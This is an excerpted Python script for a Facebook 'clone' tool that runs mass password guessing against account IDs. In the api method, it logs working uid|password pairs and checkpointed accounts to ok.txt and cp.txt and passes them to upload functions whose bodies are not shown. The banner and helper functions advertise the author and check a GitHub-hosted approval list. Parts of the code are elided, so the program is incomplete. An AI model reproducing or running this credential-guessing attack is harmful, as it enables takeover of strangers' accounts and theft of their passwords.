...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/XK1L71"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/xark.xuckerberg1.0")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ MESSENGER😘🔰https://m.me/xark.xuckerberg1.0")
	subprocess.check_output(["am", "start", "https://m.me/xark.xuckerberg1.0"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/XK1L71/pom/blob/main/pompom.approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : ARAFAT AFIF   
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mVERSION : UMMAH XAK1L
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : https://github.com/XK1L71
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : DON'T FORGET ALLAH
\033[1;90m══════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %sXAK1L❌ PRO CLONE❌"%(G,R,G,B,G))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: xakil): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [MG-OK] : %s/%s -> \033[0;92m [ MG-OK:%s ]- \033[0;91m[CP-MG-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[OK-MG-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [OK-MG-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[CP-MG-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [CP-MG-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
